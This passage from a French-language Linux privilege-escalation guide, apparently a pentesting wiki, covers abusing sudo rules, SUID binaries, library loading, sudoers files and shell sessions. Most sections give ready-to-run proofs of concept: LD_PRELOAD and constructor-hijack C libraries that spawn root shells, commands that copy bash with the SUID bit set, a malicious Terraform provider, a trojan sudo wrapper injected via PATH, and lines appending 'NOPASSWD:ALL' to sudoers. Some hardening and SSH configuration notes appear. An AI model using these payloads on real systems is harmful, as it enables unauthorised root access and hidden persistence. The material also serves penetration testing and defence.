- Pourquoi cela fonctionne : dans le cas des shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d’exécuter le script cible. De nombreuses règles sudo autorisent l’exécution d’un script ou d’un wrapper de shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.<sup>[[23]](#references)</sup>

- Prérequis :
  - Une règle sudo que vous pouvez exécuter (n’importe quelle cible qui invoque `/bin/bash` en mode non interactif, ou n’importe quel script bash).
  - `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC :

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Durcissement :
  - Retirer `BASH_ENV` (et `ENV`) de `env_keep` et préférer `env_reset`.
  - Éviter les scripts wrapper pour les commandes autorisées par sudo ; utiliser des binaires minimalistes.
  - Envisager la journalisation des E/S de sudo et des alertes lorsque des variables d’environnement conservées sont utilisées.

### Terraform via sudo avec HOME conservé (!env_reset)

Lorsque sudo autorise l’exécution de Terraform en tant qu’utilisateur plus privilégié, `!env_reset` indique qu’il faut vérifier quelles variables d’environnement sont effectivement conservées par cette règle. Vérifiez la valeur effective de `HOME` ou de `TF_CLI_CONFIG_FILE` avant de considérer un `.terraformrc` ou `terraform.rc` modifiable par l’appelant comme la configuration CLI active. Une entrée `provider_installation.dev_overrides` n’a d’importance que si la commande Terraform fixe charge ce provider et si l’appelant peut placer son exécutable dans le répertoire sélectionné.<sup>[[25]](#references)</sup>

- Diriger le provider requis vers un répertoire modifiable et y déposer un plugin malveillant portant le nom du provider (par exemple, `terraform-provider-examples`) :

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform échouera lors du handshake du plugin Go, mais exécutera le payload en tant que root avant de mourir, laissant derrière lui un shell SUID.

### Contournement de validation via TF_VAR overrides et symlink

Les variables Terraform peuvent être fournies via des variables d’environnement `TF_VAR_<name>` si la règle sudo concernée les préserve. Une **lecture** via un symlink source nécessite également un provider qui suit le lien et copie le résultat protégé vers une destination lisible par l’appelant. Une **écriture** via un symlink de destination nécessite séparément une entrée de destination contrôlée par l’appelant et un provider privilégié qui la suit lors de l’écriture ; une tâche planifiée ultérieure n’est qu’une conséquence possible parmi d’autres. Avant de tester l’une ou l’autre de ces pistes, examinez l’autorisation sudo exacte, les fichiers `.tf` concernés, la configuration CLI sélectionnée et la propriété des chemins à l’aide de commandes en lecture seule telles que `sudo -l`, `stat` et `readlink`. Les validations lexicales faibles, comme `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, ne résolvent pas les symlinks :<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform résout le lien symbolique et copie le véritable `/root/root.txt` vers une destination lisible par l’attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en précréant des liens symboliques de destination (par exemple, en faisant pointer le chemin de destination du provider vers `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines anciennes distributions, sudo peut être configuré avec `requiretty`, ce qui oblige sudo à être exécuté depuis un TTY interactif. Si `!requiretty` est défini (ou si l’option est absente), sudo peut être exécuté depuis des contextes non interactifs, comme des shells inversés, des tâches cron ou des scripts.

```bash
Defaults !requiretty
```

This n’est pas une vulnérabilité directe en soi, mais cela élargit les situations où les règles sudo peuvent être détournées sans nécessiter un PTY complet.

### Sudo env_keep+=PATH / secure_path non sécurisé → PATH hijack

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées modifiables par un attaquant (par exemple, `/home/<user>/bin`), une commande externe sans chemin absolu appelée par la cible autorisée par sudo peut être remplacée.<sup>[[3]](#references)</sup> L’absence d’un `secure_path` effectif mérite également d’être examinée **si** l’environnement sudo de la commande conserve un `PATH` contrôlé par l’appelant ; cette absence, à elle seule, ne le prouve pas. Lisez le script autorisé sans l’exécuter, puis vérifiez précisément la règle RunAs et les arguments, le chemin de recherche effectif des commandes, ainsi que la présence d’un répertoire antérieur, modifiable et traversable contenant le nom de la commande. L’authentification, `NOEXEC`, les commandes intégrées du shell et les chemins absolus vers les commandes peuvent modifier le résultat.

- Prérequis : une règle sudo (souvent `NOPASSWD`) exécutant un script/binaire qui appelle des commandes sans chemin absolu (`free`, `df`, `ps`, etc.), ainsi qu’une entrée du PATH modifiable qui est recherchée en premier.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Contournement des chemins lors de l’exécution avec sudo
**Naviguez** pour lire d’autres fichiers ou utilisez des **liens symboliques**. Par exemple, dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Si un **wildcard** est utilisé (\*), c'est encore plus facile :

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande Sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est accordée pour une seule commande **sans préciser le chemin** : _hacker10 ALL= (root) less_, vous pouvez l’exploiter en modifiant la variable PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Cette technique peut également être utilisée si un binaire **suid** **exécute une autre commande sans en spécifier le chemin (vérifiez toujours avec** _**strings**_ **le contenu d’un binaire SUID suspect)**.

[Exemples de payloads à exécuter.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le binaire **suid** **exécute une autre commande en spécifiant son chemin**, vous pouvez alors essayer **d’exporter une fonction** portant le nom de la commande appelée par le fichier suid.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l’exporter :

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Ensuite, lorsque vous appelez le binaire SUID, cette fonction sera exécutée

### Wrappers de copie SUID personnalisés

Un utilitaire SUID appartenant à root qui accepte des chemins source et destination peut franchir deux frontières de confiance différentes. S’il construit une commande shell à partir de l’un ou l’autre argument (par exemple en passant une commande `cp` construite à `system()`), des métacaractères shell peuvent exécuter une autre commande avec ses privilèges effectifs. Même s’il invoque `cp` sans risque, sans passer par un shell, une destination sans restrictions peut permettre une écriture privilégiée arbitraire dans des fichiers comme `/etc/passwd`. Examinez la gestion des arguments du wrapper, son comportement vis-à-vis de l’UID effectif, les restrictions de destination et la possibilité que le fichier copié conserve un contenu contrôlé par l’appelant ; une erreur générique de `cp` ou le seul bit SUID ne prouve aucun de ces scénarios. Répertoriez le binaire et ses permissions de manière passive avant tout test manuel.

### Script modifiable exécuté par un wrapper SUID

Une erreur de configuration fréquente dans les applications personnalisées est un wrapper binaire SUID appartenant à root qui exécute un script, alors que ce script est modifiable par des utilisateurs à faibles privilèges.

Schéma typique :

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Si `/usr/local/bin/backup.sh` est accessible en écriture, vous pouvez ajouter des commandes de payload, puis exécuter le wrapper SUID :

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Vérifications rapides :

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Ce vecteur d’attaque est particulièrement courant dans les wrappers de « maintenance »/« sauvegarde » fournis dans `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d’environnement **LD_PRELOAD** sert à spécifier une ou plusieurs bibliothèques partagées (fichiers .so) à charger par le chargeur avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé préchargement d’une bibliothèque.

Cependant, pour préserver la sécurité du système et empêcher l’exploitation de cette fonctionnalité, notamment avec les exécutables **suid/sgid**, le système impose certaines conditions :

- Le chargeur ignore **LD_PRELOAD** pour les exécutables dont l’ID utilisateur réel (_ruid_) ne correspond pas à l’ID utilisateur effectif (_euid_).
- Pour les exécutables suid/sgid, seules les bibliothèques situées dans des chemins standard et ayant également le bit suid/sgid sont préchargées.

Une élévation de privilèges est possible si vous pouvez exécuter des commandes avec `sudo` et si la sortie de `sudo -l` contient l’instruction **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d’environnement **LD_PRELOAD** de persister et d’être prise en compte même lorsque des commandes sont exécutées avec `sudo`, ce qui peut entraîner l’exécution de code arbitraire avec des privilèges élevés.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Enregistrer sous **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compilez-le ensuite à l’aide de :

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Enfin, **escaladez les privilèges** en exécutant

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Un privesc similaire peut être exploité si l’attaquant contrôle la variable d’environnement **LD_LIBRARY_PATH**, car il contrôle le chemin dans lequel les bibliothèques seront recherchées.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binaire SUID – injection de .so

Lorsqu’on rencontre un binaire avec des permissions **SUID** qui semble inhabituel, il est recommandé de vérifier s’il charge correctement les fichiers **.so**. Pour cela, exécutez la commande suivante :<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère une possibilité d’exploitation.

Pour l’exploiter, on créerait un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions des fichiers et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessus en un objet partagé (.so) avec :

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Enfin, l’exécution du binaire SUID concerné devrait déclencher l’exploit et permettre une éventuelle compromission du système.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Maintenant que nous avons trouvé un binaire SUID qui charge une bibliothèque depuis un dossier dans lequel nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom nécessaire :

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Si vous obtenez une erreur telle que

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

cela signifie que la bibliothèque que vous avez générée doit contenir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est similaire, mais concerne les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet répertorie des fonctions légitimes de binaires Unix qui peuvent être détournées pour sortir de shells restreints, élever ou conserver des privilèges élevés, transférer des fichiers, lancer des bind et reverse shells, et faciliter d’autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l’outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s’il trouve un moyen d’exploiter une règle sudo.

### Réutilisation des jetons Sudo

Si vous avez **accès à sudo**, mais pas le mot de passe, vous pouvez élever vos privilèges en **attendant l’exécution d’une commande sudo, puis en détournant le jeton de session**.<sup>[[18]](#references)</sup>

Conditions requises pour élever les privilèges :

- Vous avez déjà un shell en tant qu’utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose au cours des **15 dernières minutes** (par défaut, c’est la durée du jeton sudo qui nous permet d’utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` renvoie 0
- `gdb` est accessible (vous devez pouvoir le téléverser)

(Vous pouvez activer temporairement `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou le modifier de façon permanente dans `/etc/sysctl.d/10-ptrace.conf` en définissant `kernel.yama.ptrace_scope = 0`.)

Si toutes ces conditions sont remplies, **vous pouvez élever vos privilèges avec :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l’utiliser pour **activer le jeton sudo dans votre session** (vous n’obtiendrez pas automatiquement un shell root, exécutez `sudo su`) :

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec le bit setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- Le **third exploit** (`exploit_v3.sh`) **créera un fichier sudoers** qui rend les **jetons sudo éternels et permet à tous les utilisateurs d’utiliser sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Si vous avez des **permissions d’écriture** dans le dossier ou sur l’un des fichiers créés à l’intérieur, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en exécutant :

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers du répertoire `/etc/sudoers.d` configurent qui peut utiliser `sudo` et de quelle manière. Par défaut, **seuls l’utilisateur root et le groupe root peuvent lire ces fichiers**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez **obtenir des informations intéressantes** et, si vous pouvez **écrire** dans un fichier, vous pourrez **escalader vos privilèges**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Si vous pouvez écrire, vous pouvez abuser de cette permission.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Une autre façon d’abuser de ces permissions :

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Il existe des alternatives au binaire `sudo`, comme `doas` pour OpenBSD. Pensez à vérifier sa configuration dans `/etc/doas.conf`.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Si `doas` autorise un éditeur ou un interpréteur, vérifiez les techniques d’évasion de type GTFOBins :

```bash
doas vim
:!/bin/sh
```

Une règle `doas` donnant accès à root pour le `dstat` original basé sur Python mérite également un examen du chemin des plugins. Son [manuel](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) et son [code source](https://github.com/dstat-real/dstat/blob/master/dstat) indiquent `/usr/share/dstat/` et `/usr/local/share/dstat/` parmi les emplacements des plugins `dstat_*.py`. Si l’utilisateur actuel peut écrire dans un emplacement effectivement utilisé par la version installée et y accéder, un plugin sélectionné peut s’exécuter avec l’identité RunAs de `doas`. Vérifiez la règle effective, la recherche des plugins par cette version, les permissions ou ACL du répertoire et de ses parents, ainsi que la possibilité pour l’appelant de sélectionner un plugin ; une règle `dstat` ou un répertoire accessible en écriture ne constitue qu’une piste. D’autres implémentations de `dstat` peuvent utiliser des systèmes de plugins différents. Examinez les métadonnées sans charger de plugin.

### Sudo Hijacking

Si vous savez qu’un **utilisateur se connecte généralement à une machine et utilise `sudo`** pour élever ses privilèges et que vous avez obtenu un shell dans le contexte de cet utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root, puis la commande de l’utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple, en ajoutant le nouveau chemin dans .bash_profile) afin que, lorsque l’utilisateur exécute sudo, votre exécutable sudo soit lancé.

Notez que si l’utilisateur utilise un autre shell (pas bash), vous devrez modifier d’autres fichiers pour ajouter le nouveau chemin. Par exemple, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc` et `~/.bash_profile`. Vous trouverez un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d’où proviennent les fichiers de configuration chargés**. En général, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d’autres dossiers** dans lesquels les **bibliothèques** seront **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système recherchera des bibliothèques dans `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur dispose des permissions d’écriture** sur l’un des chemins indiqués — `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, un fichier situé dans `/etc/ld.so.conf.d/` ou un dossier indiqué dans un fichier de configuration de `/etc/ld.so.conf.d/*.conf` — il pourrait être en mesure d’escalader ses privilèges.\
Consultez **comment exploiter cette mauvaise configuration** sur la page suivante :


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

En copiant la lib dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement, comme indiqué dans la variable `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Créez ensuite une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capacités

Les capacités Linux fournissent **un sous-ensemble des privilèges root disponibles à un processus**. Cela revient à diviser les **privilèges root en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. Ainsi, l’ensemble complet des privilèges est réduit, ce qui diminue les risques d’exploitation.\
Consultez la page suivante pour **en savoir plus sur les capacités et sur la manière d’en abuser** :


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit « execute »** signifie que l’utilisateur concerné peut faire un « **cd** » dans le dossier.\
Le bit **« read »** signifie que l’utilisateur peut **lister** les **fichiers**, et le bit **« write »** signifie qu’il peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Les listes de contrôle d’accès (ACLs) constituent la couche secondaire des permissions discrétionnaires, capable de **remplacer les permissions ugo/rwx traditionnelles**. Ces permissions renforcent le contrôle de l’accès aux fichiers ou aux répertoires en permettant ou en refusant des droits à des utilisateurs qui ne sont ni propriétaires ni membres du groupe. Ce niveau de **granularité garantit une gestion plus précise des accès**. Vous trouverez plus de détails [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Accorder** à l’utilisateur « kali » des permissions de lecture et d’écriture sur un fichier :

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Récupérer** les fichiers ayant des ACL spécifiques sur le système :

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Porte dérobée ACL cachée dans les fichiers drop-in de sudoers

Une mauvaise configuration courante consiste à avoir un fichier appartenant à root dans `/etc/sudoers.d/` avec le mode `440`, qui accorde malgré tout un accès en écriture à un utilisateur avec de faibles privilèges via une ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Si vous voyez quelque chose comme `user:alice:rw-`, l'utilisateur peut ajouter une règle sudo malgré des bits de mode restrictifs :

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Il s’agit d’une voie de persistance via ACL et de privesc à fort impact, car elle passe facilement inaperçue lors des vérifications limitées à `ls -l`.

## Sessions shell ouvertes

L’accès inter-utilisateur à GNU Screen dépend de la **configuration et des ACL de la session en cours d’exécution**, et pas seulement de sa version. [La documentation de GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) indique que le programme doit être compilé avec la prise en charge du mode multiuser ; `multiuser on` et une autorisation `acladd` ou `aclchg` appropriée permettent à un autre utilisateur de s’attacher à la session. [Le manuel exige également le bit setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) pour la recherche inter-utilisateur de sessions. Un socket appartenant à root visible ou un binaire `screen` SUID ne suffit pas à établir qu’un shell root est accessible. Avant de considérer cela comme une escalade de privilèges, vérifiez que la session active est en mode multiuser, que l’utilisateur actuel dispose effectivement des permissions de saisie/de commande et que le shell de cette session s’exécute avec les privilèges de son propriétaire.

### screen sessions hijacking

**Lister les sessions screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Emplacements des sockets (certains systèmes exposent l’un comme lien symbolique de l’autre) : ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**S’attacher à une session**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Détournement de sessions tmux

C'était un problème avec les **anciennes versions de tmux**. Je n'ai pas réussi à détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Emplacements des sockets (certains systèmes en exposent un comme lien symbolique vers l’autre) - détournement de sessions tmux : tmux -S /tmp/dev sess ls Liste avec ce socket ; vous pouvez démarrer une session tmux sur ce socket...](<../../images/image (837).png>)

**Se connecter à une session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Consultez **Valentine box from HTB** pour un exemple.

## SSH

### PRNG prévisible d’OpenSSL sur Debian - CVE-2008-0166

Les clés générées avec des versions vulnérables d’OpenSSL sur Debian ou ses dérivés pendant la période historique de vulnérabilité peuvent reposer sur une valeur aléatoire prévisible ; la distribution actuelle de l’hôte ou la version corrigée d’OpenSSL ne permet pas de déterminer comment une ancienne clé a été générée. Vérifiez la **clé concernée** à l’aide d’une liste noire historique appropriée et examinez sa provenance. Le [manuel `ssh-vulnkey` de Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) explique comment vérifier les clés publiques et `authorized_keys`, et [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) consigne le correctif d’OpenSSL. Une entrée dans le fichier `authorized_keys` d’un compte privilégié constitue une piste d’escalade uniquement si la clé privée correspondante peut être récupérée et si la politique SSH effective accepte toujours cette clé pour ce compte ; une clé **d’hôte** faible ne constitue pas en soi un identifiant de connexion. Remplacez les clés compromises et supprimez leurs anciennes autorisations.

### Valeurs de configuration SSH intéressantes

- **PasswordAuthentication :** indique si l’authentification par mot de passe est autorisée. La valeur par défaut d’OpenSSH en amont est `yes` ; la configuration de la distribution peut la remplacer.
- **PubkeyAuthentication :** indique si l’authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords** : lorsque l’authentification par mot de passe est autorisée, indique si le serveur permet la connexion aux comptes dont le mot de passe est vide. La valeur par défaut est `no`.

### Fichiers de contrôle des connexions

Ces fichiers influencent qui peut se connecter et de quelle manière :

- **`/etc/nologin`** : s’il existe, bloque les connexions des utilisateurs autres que root et affiche son message.
- **`/etc/securetty`** : limite les endroits depuis lesquels root peut se connecter (liste d’autorisation des TTY).
- **`/etc/motd`** : bannière affichée après la connexion (peut révéler des informations sur l’environnement ou la maintenance).

### PermitRootLogin

Indique si root peut se connecter via ssh. La valeur par défaut d’OpenSSH en amont est `prohibit-password` ; la configuration de la distribution peut la remplacer. Valeurs possibles :

- `yes` : root peut se connecter avec un mot de passe ou une clé privée
- `without-password` ou `prohibit-password` : root peut se connecter uniquement avec une clé privée
- `forced-commands-only` : root peut se connecter uniquement avec une clé privée et si les options de commande sont spécifiées
- `no` : aucune connexion

### Autorités de certification SSH utilisateur de confiance

`TrustedUserCAKeys` désigne les clés publiques auxquelles sshd fait confiance pour signer des certificats **utilisateur**. Si la clé privée de l’autorité de certification correspondante est lisible par un utilisateur moins privilégié, vérifiez qui peut obtenir un certificat et avec quels principaux de compte celui-ci pourrait s’authentifier. `AuthorizedPrincipalsFile` ou `AuthorizedPrincipalsCommand` peut restreindre les noms acceptés ; si aucun des deux n’est configuré, le certificat doit contenir le nom du compte cible. `PermitRootLogin prohibit-password` bloque l’authentification de root par mot de passe, mais peut toujours autoriser l’authentification par certificat. La seule présence d’un chemin vers une clé exposée ne prouve pas qu’un accès est possible : vérifiez la paire de clés publique/privée, les règles `Match` effectives, la politique du compte, la phrase secrète de la clé, la révocation et les algorithmes de signature acceptés. N’incluez pas les octets des clés privées dans les résultats de l’énumération. Consultez le [manuel de configuration du serveur OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

